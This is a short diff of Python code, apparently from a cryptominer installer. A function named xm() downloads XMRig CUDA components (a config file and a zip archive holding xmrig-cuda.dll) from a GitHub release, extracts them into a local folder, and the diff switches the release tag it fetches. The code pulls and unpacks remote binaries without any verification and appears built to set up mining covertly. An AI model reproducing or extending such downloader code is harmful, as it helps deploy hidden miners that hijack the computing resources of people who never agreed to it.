@@ -45,7 +45,7 @@ def xm():
          urllib.request.urlretrieve(rawrepo + '/main/cuda/config.json', '{}/config.json'.format(xmpath))
          
       if not os.path.exists(xmpath + 'xmrig-cuda.dll'):
-         urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/cuda/cuda.zip", "{}/cuda.zip".format(xmpath))
+         urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/cuda.zip", "{}/cuda.zip".format(xmpath))
          with zipfile.ZipFile("cuda.zip", 'r') as zip_ref:
             zip_ref.extractall(xmpath)
          time.sleep(3)
